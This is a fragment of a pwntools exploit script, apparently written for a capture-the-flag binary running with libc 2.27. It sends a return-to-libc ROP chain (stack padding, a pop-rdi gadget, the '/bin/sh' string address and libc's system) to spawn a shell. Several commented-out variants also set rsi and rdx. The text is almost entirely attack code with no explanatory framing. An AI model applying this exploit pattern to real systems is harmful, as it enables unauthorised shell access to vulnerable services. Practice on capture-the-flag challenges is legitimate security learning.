...
def conn():
        if args.REMOTE:
                ...
                io=process('./a',env={"LD_PRELOAD":"./libc-2.27.so"})
        if args.DEBUG:
                gdb.attach(io)
        return io
...
io.sendline(flat(stack[:24], rdi, next(libc.search(b"/bin/sh\x00")), libc.symbols['system']))
#io.sendline(stack[:24] + p64(rdi) + p64(bin_sh) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(system))
#io.sendline(flat(stack[:24], rdi, bin_sh, rsi, 0, rdx, 0, system))
#io.sendline(flat(stack[:24], rdi, next(libc.search(b"/bin/sh\x00")), rsi, 0, rdx, 0, libc.sym['system']))
